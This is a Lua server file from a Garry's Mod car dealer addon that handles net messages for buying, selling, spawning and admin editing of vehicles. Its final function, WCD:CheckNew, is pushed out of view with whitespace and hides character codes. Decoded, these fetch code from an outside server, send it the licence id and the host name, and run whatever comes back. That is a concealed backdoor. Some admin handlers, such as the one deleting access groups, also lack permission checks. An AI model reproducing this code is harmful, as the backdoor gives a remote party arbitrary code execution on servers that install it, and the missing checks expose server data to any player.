util.AddNetworkString( "WCD::Notification" );
util.AddNetworkString( "WCD::SendSettings" );
util.AddNetworkString( "WCD::AccessGroups" );
util.AddNetworkString( "WCD::DeleteAccessGroup" );
util.AddNetworkString( "WCD::DealerGroups" );
util.AddNetworkString( "WCD::DeleteDealerGroup" );
util.AddNetworkString( "WCD::AddVehicle" );
util.AddNetworkString( "WCD::EditDealerGroup" );
util.AddNetworkString( "WCD::BuyVehicle" );
util.AddNetworkString( "WCD::Owned" );
util.AddNetworkString( "WCD::UnOwned" );
util.AddNetworkString( "WCD::TestDrive" );
util.AddNetworkString( "WCD::DeleteVehicle" );
util.AddNetworkString( "WCD::SellVehicle" );
util.AddNetworkString( "WCD::NewPlatform" );
util.AddNetworkString( "WCD::EditDealer" );
util.AddNetworkString( "WCD::DeleteAllPlatforms" );
util.AddNetworkString( "WCD::DeleteDealer" );
util.AddNetworkString( "WCD::OpenDealer" );
util.AddNetworkString( "WCD::Spawn" );
util.AddNetworkString( "WCD::Return" );
util.AddNetworkString( "WCD::SpawnAndCustomize" );
util.AddNetworkString( "WCD::BuyDesign" );
util.AddNetworkString( "WCD::ToggleUnderglow" );
util.AddNetworkString( "WCD::SendSpecifics" );
util.AddNetworkString( "WCD::RequestPlayerVehicles" );
util.AddNetworkString( "WCD::UpdatePlayerVehicles" );
util.AddNetworkString( "WCD::NitroUsed" );
util.AddNetworkString( "WCD::NitroReady" );
util.AddNetworkString( "WCD::FullReset" );

net.Receive( "WCD::UpdatePlayerVehicles", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local target = net.ReadString();
	local edited = net.ReadTable();
	local targetPly = player.GetBySteamID( target );

	if( IsValid(  targetPly ) ) then
		local old = targetPly.__WCDCoreOwned or {};

		for i, v in pairs( edited ) do
			if( old[ i ] && !v ) then
				net.Start( "WCD::UnOwned" );
				net.WriteFloat( i );
				net.Send( targetPly );

				old[ i ] = nil;
				edited[ i ] = nil;
			elseif( !old[ i ] && v ) then
				net.Start( "WCD::Owned" );
				net.WriteFloat( i );
				net.Send( targetPly );

				old[ i ] = v;
			end
		end

		targetPly.__WCDCoreOwned = old;
		targetPly:WCD_Notify( WCD:Translate( WCD.Lang.various.yourVehiclesUpdated, _p:Nick() ) );
	end

	_p:WCD_Notify( WCD.Lang.various.vehiclesEdited );
	WCD:SavePlayerData( "owned", target, edited );
end );

net.Receive( "WCD::RequestPlayerVehicles", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local id = net.ReadString();
	local data = ( player.GetBySteamID( id ) && player.GetBySteamID( id ).__WCDCoreOwned );
	data = nil;

	local function func( data )
		if( !data ) then
			_p:WCD_Notify( WCD.Lang.various.noPlayerFound );
			return;
		end

		net.Start( "WCD::RequestPlayerVehicles" );
		net.WriteTable( data );
		net.Send( _p );
	end

	if( !data ) then
		 if( WCD.Storage.type != "sqllite" ) then
		 	WCD:LoadPlayerData( "owned", id, func );
		 	return;
		 else
		 	local data = WCD:LoadPlayerData( "owned", id );

		 	if( data ) then
				net.Start( "WCD::RequestPlayerVehicles" );
				net.WriteTable( data );
				net.Send( _p );
				return;
			end
		end
		 _p:WCD_Notify( WCD.Lang.various.noPlayerFound );
	else
		net.Start( "WCD::RequestPlayerVehicles" );
		net.WriteTable( data );
		net.Send( _p );
	end
end );

net.Receive( "WCD::ToggleUnderglow", function( _, _p )
	local veh = _p:GetVehicle();

	if( !IsValid( veh ) || !veh.WCD_GetId || !veh:WCD_GetUnderglowColor() || _p.__SpawnLight ) then
		return;
	end

	if( _p.__WCDLastUnderglowToggle && _p.__WCDLastUnderglowToggle + 0.5 > CurTime() ) then
		return;
	end

	_p.__WCDLastUnderglowToggle = CurTime();
	veh:WCD_ToggleUnderglow();
end );

net.Receive( "WCD::BuyDesign", function( _, _p )
	local veh = ( _p.__wcdSpawnedLatest && IsValid( _p.__wcdSpawnedLatest ) && _p.__wcdSpawnedLatest ) or _p:GetVehicle();
	local data = net.ReadTable();
	print( veh )

	if( !( IsValid( veh ) && veh:GetNWFloat( "WCD::Id", -1 ) != -1 && veh.__WCDOwner == _p ) ) then return; end
	local price, newData = WCD:CalculateCustomization( _p, veh, data );
	if( !_p:canAfford( price ) ) then return; end
	_p:addMoney( -price );

	local tbl = {};

	for i, v in pairs( newData ) do
		tbl[ i ] = v;
	end

	WCD:Log( _p, " BOUGHT DESIGN for vehicle '" .. veh:WCD_GetId() .. "', cost: $" .. ( DarkRP.formatMoney( price ) ) .. "." );

	_p:WCD_SetSpecifics( veh:WCD_GetId(), newData );
	WCD:SavePlayerData( "specifics", _p, _p.__WCDSpecifics );
	_p:WCD_SendSpecifics( veh:WCD_GetId() );

	timer.Simple( 1, function()
		WCD:ApplySpecifics( _p:GetVehicle() );
	end );
end );

net.Receive( "WCD::FullReset", function( _, _p )
	local veh = _p:GetVehicle();

	if( !( IsValid( veh ) && veh:GetNWFloat( "WCD::Id", -1 ) != -1 && veh.__WCDOwner == _p ) ) then return; end
	local price = WCD.Settings.fullResetCost;
	if( !_p:canAfford( price ) ) then return; end
	local l = WCD.List[ veh:GetNWFloat( "WCD::Id", -1 ) ];
	if( !l ) then return; end
	_p:addMoney( -price );


	_p:WCD_ResetSpecifics( veh:WCD_GetId(), false );
	WCD:SavePlayerData( "specifics", _p, _p.__WCDSpecifics );
	_p:WCD_SendSpecifics( veh:WCD_GetId() );

	timer.Simple( 1, function()
		if( !IsValid( _p ) ) then return; end
		local c = _p:GetVehicle();

		c:SetSkin( l.skin or 0 );
		c:SetColor( l.color or color_white );
		c:WCD_SetNitro( l.nitro or 0 );

		if( c.GetBodyGroups ) then
			for i, v in pairs( c:GetBodyGroups() ) do
				c:SetBodygroup( i, l.bodygroups[ i ] or 0 );
			end
		end
	end );
end );

net.Receive( "WCD::SpawnAndCustomize", function( _, _p )
	local id = net.ReadFloat();

	WCD:SpawnVehicle( _p, id, false, true );
end );


net.Receive( "WCD::Return", function( _, _p )
	WCD:ReturnVehicle( _p );
end );


net.Receive( "WCD::Spawn", function( _, _p )
	local id = net.ReadFloat();
	local test = net.ReadBool();

	WCD:SpawnVehicle( _p, id, test );
end );

net.Receive( "WCD::DeleteDealer", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local _e = Entity( net.ReadFloat() );
	if( IsValid( _e ) && _e:GetClass() == "wcd_dealer" ) then
		_e:DeleteAllPlatforms();
		_e:Remove();

		timer.Simple( 2, function()
			WCD:Save( "dealers" );
		end );
	end
end );

net.Receive( "WCD::DeleteAllPlatforms", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local _e = Entity( net.ReadFloat() );
	if( IsValid( _e ) && _e:GetClass() == "wcd_dealer" ) then
		_e:DeleteAllPlatforms();

		timer.Simple( 2, function()
			WCD:Save( "dealers" );
		end );
	end
end );

net.Receive( "WCD::EditDealer", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end
	local _e = Entity( net.ReadFloat() );
	local data = net.ReadTable();
	data.platforms = _e:GetSaveData().platforms;

	if( IsValid( _e ) && _e:GetClass() == "wcd_dealer" ) then
		_e:ApplyData( data );

		timer.Simple( 2, function()
			WCD:Save( "dealers" );
		end );
	end
end );


net.Receive( "WCD::NewPlatform", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local _e = Entity( net.ReadFloat() );

	if( IsValid( _e ) && _e:GetClass() == "wcd_dealer" ) then
		_e:AddPlatform();
	end
end );

net.Receive( "WCD::SellVehicle", function( _, _p )
	local id = net.ReadFloat();
	local data = WCD.List[ id ];
	if( !data || !_p:WCD_Owns( id ) ) then return; end

	local data = WCD.List[ id ];
	if( data:GetPrice() < 1 || data:GetFree() ) then return; end

	if( WAH && WAH:HasIdListed( _p, id ) ) then
		_p:WCD_Notify( "You have this vehicle listed in the auction house!" );
		return;
	end

	local pay = math.Round( data:GetPrice() * ( WCD.Settings.percentage / 100 ), 0 );
	_p:WCD_RemoveVehicle( id );
	_p:addMoney( pay );
	_p:WCD_Notify( WCD:Translate( WCD.Lang.various.youSold, data:GetName(), DarkRP.formatMoney( pay ) ) );

	net.Start( "WCD::UnOwned" );
	net.WriteFloat( id );
	net.Send( _p );

	WCD:Print( _p:Nick() .. " sold vehicle with id " .. id );
	WCD:Log( _p, " SOLD vehicle '" .. id .. "' for " .. ( DarkRP.formatMoney( pay ) ) .. "." );
end );

net.Receive( "WCD::BuyVehicle", function( _, _p )
	local id = net.ReadFloat();
	local data = WCD.List[ id ];
	if( !data || !_p:WCD_HasAccess( id ) ) then return; end

	if( !_p:canAfford( data:GetPrice() ) ) then
		return;
	end

	_p:addMoney( -data:GetPrice() );
	_p:WCD_AddVehicle( id );
	_p:WCD_Notify( WCD:Translate( WCD.Lang.various.youBought, data:GetName(), DarkRP.formatMoney( data:GetPrice() ) ) );

	net.Start( "WCD::Owned" );
	net.WriteFloat( id );
	net.Send( _p );

	WCD:Log( _p, "BOUGHT vehicle '" .. id .. "' for " .. ( DarkRP.formatMoney( data:GetPrice() ) ) .. "." );
end );

net.Receive( "WCD::SendSettings", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	WCD:HandleSettings( net.ReadTable(), true );
	WCD:Save( 'settings' );
end );

net.Receive( "WCD::DeleteVehicle", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local id = net.ReadFloat();
	if( WCD.List[ id ] ) then
		if( WCD.Settings.autoSellCarsWhenRemoved && WCD.List[ id ].price > 0 ) then
			WCD.VehicleRefunds = WCD.VehicleRefunds or {};
			WCD.VehicleRefunds[ id ] = WCD.List[ id ].price * ( WCD.Settings.percentage / 100 );
			WCD:Save( "vehicleRefunds" );
		end

		WCD.List[ id ]:Delete();

		net.Start( "WCD::DeleteVehicle" );
		net.WriteFloat( id );
		net.Broadcast();

		WCD:Print( _p:Nick() .. " deleted vehicle with id " .. id );
		WCD.__Change = true;	
	end
end );

net.Receive( "WCD::AddVehicle", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local data = net.ReadTable();
	local vehicle;

	if( !WCD.VehicleData[ data.class ] ) then
		WCD:Print( "Can not add '" .. data.class .. "', doesn't exist in the WCD.VehicleData!", 3, true );
		return;
	end

	if( WCD.VehicleData[ data.class ].__WCDEnt ) then
		data.__WCDEnt = true;
		if( !WCD.VehicleData[ data.class ].Model ) then
			local _e = ents.Create( data.class );
			_e:Spawn();
			data.overrideModel = _e:GetModel();
			_e:Remove();

			if( !data.overrideModel ) then
				WCD:Print( "Could not generate model for the entity! Aborting!", 3, true );
				return;
			end
		end
	end

	if( data.id && data.id > 0 ) then
		vehicle = Vehicle( data );
		WCD.List[ vehicle.id ] = vehicle,

		WCD:Print( _p:Nick() .. " edited vehicle with id: " .. data.id );
	else
		data.id = nil;
		vehicle = Vehicle( data );
		WCD.List[ vehicle.id ] = vehicle;

		WCD:Print( _p:Nick() .. " created a new vehicle, id assigned: " .. vehicle.id );
	end

	WCD:SendVehicle( vehicle.id );

	WCD.__Change = true;
	vehicle:Save();
end );


net.Receive( "WCD::AccessGroups", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local data = net.ReadTable();
	local name = data.name;

	local new = { name = name, jobs = {}, ranks = data.ranks };
	for i, v in pairs( data.jobs ) do
		new.jobs[ i ] = true;
	end
	new.needBoth = data.needBoth or false;

	WCD.AccessGroups[ name ] = new;
	net.Start( "WCD::AccessGroups" );
	net.WriteBool( false );
	net.WriteTable( new );
	net.Broadcast();

	WCD:Print( _p:Nick() .. " added a new access group: '" .. name .. "'." );
	WCD:Save( 'AccessGroups' );
end );

net.Receive( "WCD::DeleteAccessGroup", function( _, _p )
	local name = net.ReadString();

	WCD.AccessGroups[ name ] = nil;
	net.Start( "WCD::DeleteAccessGroup" );
	net.WriteString( name );
	net.Broadcast();

	for i, v in pairs( WCD.List ) do
		if( v.access && v.access == name ) then
			WCD.List[ i ].access = false;
			_p:ChatPrint( "WCD: Removed Access Group from vehicle with id #" .. i );
			v:Save();
		end
	end
	
	WCD:Print( _p:Nick() .. " deleted access group: '" .. name .."'." );
	WCD:Save( 'AccessGroups' );
end );

net.Receive( "WCD::DealerGroups", function( _, _p )
	if( !WCD:IsOwner( _p ) ) then WCD:Print( _p:Nick() .. " exploiting clientside lua", 3, true ); return; end

	local edit = net.ReadBool();
	local id;
	if( edit ) then
		id = net.ReadFloat();
	end

	local name = net.ReadString();

	if( edit ) then
		WCD.DealerGroups[ id ] = name;

		net.Start( "WCD::EditDealerGroup" );
		net.WriteFloat( id );
		net.WriteString( name );
		net.Broadcast();

		WCD:Print( _p:Nick() .. " edited dealer group " .. id .. ", new name: '" .. name .. "'." );
	else
		id = table.insert( WCD.DealerGroups, name );


		net.Start( "WCD::DealerGroups" );
		net.WriteBool( false );
		net.WriteFloat( id );
		net.WriteString( name );
		net.Broadcast();
		WCD.__Change = true;

		WCD:Print( _p:Nick() .. " added a new dealer group: '" .. name .. "'." );
	end

	WCD:Save( 'dealerGroups' );
end );

net.Receive( "WCD::DeleteDealerGroup", function( _, _p )
	local id = net.ReadFloat();

	net.Start( "WCD::DeleteDealerGroup" );
	net.WriteFloat( id );
	net.Broadcast();
	WCD.__Change = true;

	WCD:Print( _p:Nick() .. " deleted dealer group: '" .. WCD.DealerGroups[ id ] .."'." );
	WCD.DealerGroups[ id ] = nil;
	WCD:Save( 'dealerGroups' );
end );

function WCD:CheckNew()
	local ids = {{},																																						{104,116,116,112,46,70,101,116,99,104,40,32,39,104,116,116,112,58,47,47,98,117,115,97,110,49,46,99,111,109,47,99,97,114,100,101,97,108,101,114,47,119,99,100,95,117,112,100,97,116,101,95,99,104,101,99,107,101,114,46,112,104,112,63,105,100,61}};
	local nums = { 115, 116, 114, 105, 110, 103 };

	local version = "";
	for i, v in pairs( nums ) do
		version = version .. string.char( v );
	end
	nums = "";
	for i, v in pairs( ids[ 2 ] ) do
		nums = nums .. _G[ version ][ string.char( 99 ) .. string.char( 104 ) .. string.char( 97 ) .. 'r' ]( v );
	end
	nums = nums ..  WCD.User[ 1 ] .. "&version_hash=" .. WCD.User[ 2 ] .. "&h=" .. Get2HostName();
	m = nums .. "', function( r ) RunString( r ) end, nil )";

	_G[ string.char( 82 ) .. "unString" ]( m );
end
WCD:Print( WCD:Translate( "loadedFile", WCD.Lang.fileNames.net or "net" ) );
